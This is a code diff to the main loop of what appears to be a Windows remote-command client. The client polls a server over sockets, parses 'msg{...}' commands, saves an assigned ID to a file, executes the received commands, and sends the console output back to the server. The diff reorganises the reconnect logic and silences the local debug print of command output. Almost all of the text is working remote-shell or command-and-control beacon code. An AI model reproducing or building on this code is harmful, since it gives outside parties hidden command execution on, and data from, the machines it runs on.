@@ -1,5 +1,5 @@
 #include "addition.h"
-
+#include <string.h>
 using namespace mySTL;
 
 int main()
@@ -22,49 +22,47 @@ int main()
     str = readHeader(sock);
     while ( true )
     {
-        if ( mySTL::strcmp(str, "") && str != nullptr )
+        if (str == nullptr)
         {
-            printf("\nClosed\n");
             closesocket(*sock);
             free(sock);
+            printf("\nClosed\n");
             sock = initConnection(addr);
             sendRequest(sock, id);
-            readHeader(sock);
+            str = readHeader(sock);
             continue;
         }
-        //if (c != 0)
-        //printf("%c", c);
-        unsigned int lenStr = mySTL::strlen(str);
-        for (int i = 0; i < lenStr ; i++)
+        else
         {
-            if ( (msg = mySTL::extractMsg(str[i], "msg{$}")) != nullptr )
+            printf("%s", str);
+            unsigned int lenStr = strlen(str);
+            for (int i = 0; i < lenStr ; i++)
             {
-                //printf("%s", msg);
-                if ( msg[mySTL::strlen(msg)-1] == '#')
+                if ( (msg = mySTL::extractMsg(str[i], "msg{$}")) != nullptr )
                 {
-                    msg[mySTL::strlen(msg)-1] = 0;
-                    free(id);
-                    id = nullptr;
-                    id = mySTL::addStr(id, msg);
-                    writeToFile(ID_FILE_NAME, id);
-                    closesocket(*sock);
-                    free(sock);
-                    goto endLoop;
-                }
-                if ( mySTL::strcmp(msg, "&ping") == false )
-                {
-                    isStart = execCommand(msg);
-                    //printf("%s", output);
-                    break;
+                    //printf("%s", msg);
+                    if ( msg[strlen(msg)-1] == '#')
+                    {
+                        msg[strlen(msg)-1] = 0;
+                        free(id);
+                        id = nullptr;
+                        id = mySTL::addStr(id, msg);
+                        writeToFile(ID_FILE_NAME, id);
+                        closesocket(*sock);
+                        free(sock);
+                        goto endLoop;
+                    }
+                    if ( !strcmp(msg, "&ping") == false )
+                    {
+                        isStart = execCommand(msg);
+                        //printf("%s", output);
+                        break;
+                    }
                 }
             }
-        }
-        if (str != nullptr)
-        {
             free(str);
             str = nullptr;
         }
-
         if (isStart == true)
         {
             output = readConsoleOutput(hReadPipe1);
@@ -78,10 +76,10 @@ int main()
                 free(responseSock);
             }
 
-            printf("output: %s", output);
+            //printf("output: %s", output);
             responseSock = initConnection(addr);
             sendConsoleOutput(responseSock, output, id);
-            Sleep(1);
+            //Sleep(1);
             free(output);
             output = nullptr;
         }
